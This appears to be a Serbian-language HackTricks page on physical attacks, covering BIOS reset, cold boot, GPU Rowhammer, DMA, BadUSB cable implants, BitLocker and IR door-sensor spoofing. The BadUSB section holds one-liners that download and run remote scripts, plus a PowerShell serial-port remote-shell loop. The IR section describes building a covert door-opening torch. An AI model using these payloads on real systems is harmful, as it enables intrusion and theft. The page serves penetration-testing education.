# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

Podešavanja firmware-a na legacy PC računarima mogu se resetovati odvajanjem CMOS baterije ili korišćenjem dokumentovanog clear-CMOS džampera. Potrebno vreme bez napajanja zavisi od ploče, a moderne UEFI lozinke ili ključevi mogu biti smešteni u nepostojanoj flash memoriji, ugrađenom kontroleru ili bezbednosnom uređaju i zato preživeti uklanjanje baterije. Pre kratkog spajanja pinova konsultujte priručnik za ploču/servis; ova procedura takođe može učiniti TPM merenja nevažećim i pokrenuti oporavak enkripcije diska.

Na legacy x86 sistemima, alati kao što su **killCMOS** i **CmosPwd** mogu pregledati ili menjati podešavanja zasnovana na CMOS-u iz bootabilnog okruženja. CmosPwd prepoznaje formate lozinki iz dokumentovanog skupa starijih BIOS porodica i može napraviti rezervnu kopiju, vratiti ili obrisati/ukinuti CMOS stanje; njegove objavljene verzije namenjene su legacy DOS/Windows, Linux, FreeBSD i NetBSD okruženjima.<sup>[[18]](#references)</sup> Ovi alati nisu generički alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru/firmware-u.

Neki laptop firmware-i prikazuju kod izazova specifičan za proizvođača nakon nekoliko neuspešnih pokušaja lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu izvesti legacy lozinke za oporavak određenih modela proizvođača, ali mnogi sistemi primenjuju lockout bez koda izazova koji se može izvesti. Svaku generisanu lozinku tretirajte kao specifičnu za model i izbegavajte iscrpljivanje brojača pokušaja koji se ne može trajno resetovati.

### UEFI bezbednost

Za moderne **UEFI** sisteme, CHIPSEC može proveriti zaštitu Secure Boot promenljivih. Započnite proverom koja ne menja sistem u nastavku; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na oporavljivom lab sistemu. Sam CHIPSEC upozorava da njegov privilegovani drajver i pristup hardveru niskog nivoa nisu pogodni za produkcione endpoint uređaje.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analiza RAM-a i Cold Boot napadi

DRAM ne gubi svaki bit odmah nakon prestanka osvežavanja. Brzina degradacije značajno zavisi od tehnologije modula i temperature; hlađenje može očuvati korisne podatke znatno duže nego nehlađeni ciklus isključivanja i uključivanja. Cold-boot napad brzo ponovo pokreće sistem u malom okruženju za prikupljanje podataka ili prenosi ohlađeni modul, snima sirovu memoriju i rekonstruiše kriptografske ključeve uprkos degradaciji bitova. Disk-copy alat nije automatski alat za snimanje fizičke memorije, a Volatility analizira snimak umesto da ga prikuplja; koristite alat za prikupljanje podataka koji odgovara platformi i koji je validiran.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer protiv tabela stranica

Moderni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **GPU metapodatke virtuelne memorije** umesto uobičajenih bafera. Nedavna istraživanja **GDDR6 NVIDIA Ampere GPU-ova** pokazuju da napadač koji izvršava neprivilegovani CUDA kod može da napravi obrasce hammerovanja specifične za GPU, koristi **memory massaging** za smeštanje struktura straničenja u ranjive redove, a zatim menja bitove u **last-level page table** ili posrednom **page directory**. Kada se jedan unos za prevođenje ošteti, napadač može da uspostavi **proizvoljno čitanje/pisanje GPU memorije**, a zatim pređe na kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove pogodne za hammerovanje** u GDDR6 memoriji i napraviti obrasce hammerovanja koji uzimaju u obzir osvežavanje / nisu uniformni, kako bi zaobišli mitigacije u DRAM-u.
2. **Manipulisati GPU alokacijama** tako da drajver postavi strukture za prevođenje stranica na fizičke lokacije pogodne za hammerovanje, umesto da ih zadrži u podrazumevanom zaštićenom pool-u. U praksi to može značiti iscrpljivanje regiona sa page-table strukturama u niskoj memoriji i raspoređivanje velikih retkih UVM mapiranja sa kontrolisanim koracima.
3. **Izmeniti metapodatke prevođenja**, kao što su **PFN** ili bitovi povezani sa aperture-om, unutar page-table / page-directory unosa, tako da virtuelna stranica pod kontrolom napadača pokazuje na page-table stranice, proizvoljnu GPU memoriju ili sistemska mapiranja vidljiva hostu.
4. Iskoristiti falsifikovano mapiranje za prepisivanje dodatnih unosa prevođenja i eskalirati do **proizvoljnog čitanja/pisanja GPU memorije** kroz GPU kontekste.

### Prelazak na host i mitigacije

- Kada je **IOMMU onemogućen**, falsifikovana system-aperture mapiranja mogu izložiti proizvoljnu **fizičku memoriju hosta** GPU-u, pretvarajući GPU primitivu u potpuno kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja unose last-level page table-a, dok **GeForge** pokazuje da oštećivanje nivoa page directory-ja može biti lakše jer jedna promena bita može preusmeriti veće podstablo prevođenja. Ne treba smatrati samo jedan nivo straničenja kritičnim za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan put do proizvoljne memorije hosta koji koriste GDDRHammer/GeForge, ali **nije potpuna mitigacija**. **GPUBreach** pokazuje drugostepeni prelaz u kojem napadač oštećuje CPU baferе kojima može da piše GPU i koji su u vlasništvu drajvera, a zatim aktivira greške u NVIDIA drajveru povezane sa bezbednošću memorije kako bi dobio primitivu za upis u kernel i **root shell**, čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **System-level ECC** je praktičan korak za ojačavanje na podržanim workstation/server GPU-ovima. Consumer GPU-ovi bez ECC-a izloženi su slabijoj odbrani.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1.171** promenjen bit na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izgradnju funkcionalnog lanca eskalacije privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) napadi

**Inception** demonstrira prikupljanje i patching memorije zasnovano na **DMA-u** preko interfejsa kao što su FireWire i rane Thunderbolt konfiguracije, uključujući istorijske obrasce za zaobilaženje prijavljivanja. Nije jednostavno „neefikasan protiv Windows-a 10“: mogućnost eksploatacije zavisi od interfejsa, build-a sistema, IOMMU politike, stanja zaključavanja i toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, čime se površina napada značajno promenila.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može zameniti accessibility binarne datoteke kao što su **sethc.exe** ili **Utilman.exe** sa **cmd.exe**, čime se dobija SYSTEM command prompt kada se aktivira odgovarajuća prečica na ekranu za prijavljivanje. Alati kao što je **chntpw** mogu uređivati podatke lokalnih SAM naloga. Ove metode ne zaobilaze zaključan BitLocker volumen i mogu oštetiti akreditive zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i backup-e.

**Kon-Boot** je komercijalni alat za zaobilaženje autentifikacije pri pokretanju sistema za podržane Windows/macOS konfiguracije. Kompatibilnost zavisi od OS-a, režima firmware-a, Secure Boot-a i podešavanja enkripcije diska; ne dešifruje BitLocker-om zaključan volumen.<sup>[[10]](#references)</sup>

---

## Rukovanje Windows bezbednosnim funkcijama

### Prečice za pokretanje i oporavak

- **Delete/Supr**, F2, F10 ili drugi taster proizvođača može otvoriti podešavanja firmware-a.
- **F8** ulazi u zastarele Windows napredne opcije pokretanja samo na konfiguracijama na kojima je ta putanja i dalje omogućena; način ulaska u aktuelni recovery se razlikuje.
- Držanje tastera **Shift** može sprečiti Windows automatsko prijavljivanje u nekim konfiguracijama, iako policy/registry podešavanja mogu onemogućiti takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy ploče mogu da se registruju kao pouzdane HID tastature i unose unapred definisane tastere. Payload u početku ima privilegije i pristup desktopu prijavljene sesije; UAC prompt-i, zaključavanje ekrana, raspored tastature, vremensko usklađivanje i USB policy krajnje tačke i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator ili backup privilegije mogu kreirati shadow copy ili sačuvati registry hive-ove, čime se mogu pribaviti zaključane datoteke kao što su **SAM** i **SYSTEM**. Ovo je tehnika prikupljanja podataka nakon kompromitovanja, a ne zaobilaženje privilegija, i treba je povezati sa događajima `diskshadow`/VSS i izvoza registry hive-ova.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implant-i

- Implant-i zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, registruju se isključivo kao USB tastatura i izlažu svoj C2 stack preko Wi-Fi-ja. Operateru je potrebno samo da napaja kabl sa hosta žrtve, kreira hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) kako bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Browser UI pruža kartice za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i označeni su prema OS-u, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu se izmeniti tako da oponašaju poznate periferne uređaje.
- Pošto se C2 nalazi unutar kabla, telefon može pripremati payload-e, pokretati njihovo izvršavanje i upravljati Wi-Fi akreditivima bez korišćenja mreže organizacije — korisno za fizičke upade sa kratkim vremenom zadržavanja.

### OS-aware AutoExec payload-i

- AutoExec pravila povezuju jedan ili više payload-a sa njihovim trenutnim pokretanjem nakon USB enumeracije. Implant vrši osnovno fingerprinting određivanje OS-a i bira odgovarajuću skriptu.
- Primer workflow-a:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, jednostavna zamena kabla za punjenje može ostvariti početni „plug-and-pwn“ pristup u kontekstu prijavljenog korisnika.

### HID-bootstrapped remote shell preko Wi-Fi TCP-a

1. **Keystroke bootstrap:** Sačuvani payload otvara konzolu i lepi petlju koja izvršava sve što stigne na novom USB serijskom uređaju. Minimalna Windows varijanta je:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP client (Python script, Android APK ili desktop executable) nazad ka operatoru. Svi bajtovi uneti u TCP sesiju prosleđuju se u prethodno opisanu serijsku petlju, čime se omogućava remote command execution čak i na air-gapped hostovima. Izlaz je ograničen, pa operatori obično izvršavaju blind commands (kreiranje naloga, staging dodatnih alata itd.).

### HTTP OTA update površina

- Dokumentovani Evil Crow Cable Wind interfejs izlaže endpoint za firmware update bez autentikacije na `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Terenski operateri mogu da menjaju funkcije u hodu (npr. flash USB Army Knife firmware) usred angažovanja bez otvaranja kabla, što omogućava implantu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker Encryption

Ovlašćena forenzička akvizicija aktivnog ili nedavno pokrenutog sistema može sadržati BitLocker volume master key ili povezani ključni materijal dok je volume otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu pretraživati podržane memory images, hibernation files ili crash dumps, ali uspeh nije zagarantovan. Moderni Windows takođe šifruje crash dumps kada je BitLocker omogućen, a sačuvana 48-cifrena recovery password predstavlja drugačiji artefakt od volume key-a koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering za dodavanje Recovery Key-a

Napadač koji ubedi administratora da pokrene BitLocker-management commands može dodati recovery-password, external-key ili drugi protector, a zatim ga preuzeti. Recovery password ne može biti proizvoljan niz nula: BitLocker numerical recovery passwords imaju validirani format od 48 cifara. Relevantna sintaksa za ovlašćenu administraciju je `manage-bde -protectors -add C: -recoverypassword`; dobijene protectors možete izlistati pomoću `manage-bde -protectors -get C:`. Pratite dodavanje protectors i osigurajte da se novi recovery material čuva samo na odobrenim lokacijama.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje Chassis Intrusion / Maintenance Switches za vraćanje BIOS-a na fabrička podešavanja

Mnogi moderni laptopovi i desktop računari malog formata sadrže **chassis-intrusion switch** koji nadziru Embedded Controller (EC) i BIOS/UEFI firmware. Iako je primarna namena switch-a da podigne upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu recovery prečicu** koja se aktivira kada se switch prebaci po određenom obrascu.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Switch je povezan na **GPIO interrupt** na EC-u.
2. Firmware koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada se prepozna hard-coded obrazac, EC poziva *mainboard-reset* rutinu koja **briše sadržaj sistemskog NVRAM/CMOS-a**.
4. Pri sledećem pokretanju, pogođeni modeli učitavaju resetovano stanje firmware-a. U zavisnosti od proizvođača i revizije, obrisano stanje može obuhvatati supervisor password, prilagođena podešavanja pokretanja ili upisane Secure Boot ključeve; stanje TPM-a i efekte disk-enkripcije treba proceniti zasebno.

> Reset firmware-a može ponovo omogućiti opcije za pokretanje sa spoljašnjih uređaja, ali **ne dešifruje skladište**. BitLocker ili drugi sistem full-disk encryption-a može preći u recovery nakon promena TPM-a/firmware-a i i dalje štititi interni disk bez recovery key-a.<sup>[[16]](#references)</sup>

### Primer iz stvarnog sveta – Framework 13 Laptop

Recovery prečica za Framework 13 (11th/12th/13th-gen) je:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nakon desetog ciklusa EC postavlja zastavicu koja nalaže BIOS-u da pri sledećem ponovnom pokretanju obriše NVRAM. Ceo postupak traje ~40 s i zahteva **samo odvijač**.<sup>[[5]](#references)</sup>

### Opšti postupak eksploatacije

1. Uključite metu ili izvršite suspend-resume kako bi EC bio pokrenut.
2. Uklonite donji poklopac da biste pristupili prekidaču za detekciju upada/održavanje.
3. Ponovite obrazac prebacivanja specifičan za proizvođača (pogledajte dokumentaciju i forume ili reverse-engineer-ujte firmware EC-ja).
4. Ponovo sklopite uređaj i pokrenite ga, a zatim proverite koja su se podešavanja firmware-a i akreditivi zaista promenili.
5. Ako ste za to ovlašćeni i dostupan je eksterni boot, pokrenite kontrolisanu live image. Kada je interni volumen legitimno otključan (ili nikada nije bio šifrovan), live okruženje može pribaviti akreditive i podatke ili pregledati EFI System Partition. Izmena te particije radi instaliranja EFI implanta je trajna i veoma intruzivna, a i dalje je ograničavaju Secure Boot, measured boot, zaštita firmware-a od upisa i nadzor endpointa. Šifrovana memorija ostaje nedostupna bez ključa ili materijala za oporavak.

### Detekcija i ublažavanje

* Beležite događaje upada u kućište u konzoli za upravljanje OS-om i korelišite ih sa neočekivanim resetovanjima BIOS-a.
* Koristite **zaptivke koje pokazuju neovlašćeno otvaranje** na šrafovima/poklopcima kako biste otkrili otvaranje.
* Držite uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpunu kompromitaciju.
* Gde je dostupno, onemogućite funkciju proizvođača “maintenance switch reset” ili zahtevajte dodatnu kriptografsku autorizaciju za resetovanje NVRAM-a.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Karakteristike senzora
- Komercijalno dostupni “wave-to-exit” senzori kombinuju near-IR LED emiter sa prijemnim modulom nalik onom u TV daljinskom upravljaču, koji prijavljuje logic high tek nakon što registruje više impulsa (~4–10) odgovarajućeg nosioca (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični štitnik sprečava emiter i prijemnik da gledaju direktno jedan u drugi, pa kontroler pretpostavlja da svaki validovani nosilac potiče od obližnje refleksije i aktivira relej koji otvara bravu vrata.
- Kada kontroler zaključi da je meta prisutna, često menja izlazni modulacioni omotač, ali prijemnik i dalje prihvata svaki burst koji odgovara filtriranom nosiocu.

### Tok napada
1. **Snimite profil emitovanja** – priključite logic analyser preko pinova kontrolera kako biste zabeležili talasne oblike pre detekcije i nakon nje, koji pokreću interni IR LED.
2. **Replay-ujte samo talasni oblik “nakon detekcije”** – uklonite/zanemarite fabrički emiter i pokrenite eksterni IR LED već aktiviranim pattern-om od samog početka. Pošto prijemnik proverava samo broj impulsa/frekvenciju, tretira spoofed carrier kao stvarnu refleksiju i aktivira liniju releja.
3. **Ograničite prenos** – emitujte carrier u podešenim burst-ovima (npr. desetine milisekundi uključen, približno isto toliko isključen) kako biste poslali minimalan broj impulsa bez zasićenja AGC-a prijemnika ili njegove logike za obradu interference-a. Kontinuirano emitovanje brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Reflective Injection dugog dometa
- Zamena bench LED-a IR diodom velike snage, MOSFET driver-om i fokusirajućom optikom omogućava pouzdano aktiviranje sa udaljenosti od ~6 m.
- Napadaču nije potrebna direktna vidljivost do otvora prijemnika; usmeravanje snopa ka unutrašnjim zidovima, policama ili okvirima vrata koji se vide kroz staklo omogućava da reflektovana energija uđe u vidno polje od ~30° i oponaša mahanje rukom iz neposredne blizine.
- Pošto prijemnici očekuju samo slabe refleksije, mnogo jači eksterni snop može se odbijati od više površina i i dalje ostati iznad praga detekcije.

### Weaponised Attack Torch
- Ugradnja driver-a u komercijalnu baterijsku lampu skriva alat na vidnom mestu. Zamenite vidljivi LED IR LED-om velike snage koji odgovara opsegu prijemnika, dodajte ATtiny412 (ili sličan mikrokontroler) za generisanje burst-ova od ≈30 kHz i upotrebite MOSFET za odvođenje struje kroz LED.
- Teleskopsko zoom sočivo sužava snop radi dometa/preciznosti, dok vibracioni motor pod kontrolom MCU-ja pruža haptičku potvrdu da je modulacija aktivna, bez emitovanja vidljive svetlosti.
- Cikliranje kroz nekoliko sačuvanih modulacionih pattern-a (blago različite frekvencije nosioca i omotači) povećava kompatibilnost između rebrendiranih porodica senzora, omogućavajući operateru da prelazi snopom preko reflektivnih površina dok relej zvučno ne klikne i vrata se ne otvore.

---

## References

- [1] [GDDRHammer: Značajno ometanje DRAM redova — Cross-Component Rowhammer napadi sa modernih GPU-ova](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pritisnite ovde da biste izvršili pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Vodič za resetovanje matične ploče](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Ne, hvala na dodir! – Zaobilaženje IR No-Touch senzora za izlaz pomoću Covert IR Torch-a”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Zvanična dokumentacija i informacije o kompatibilnosti alata Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC dokumentacija - zaštite Secure Boot promenljivih](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky dokumentacija](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd dokumentacija i preuzimanja](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
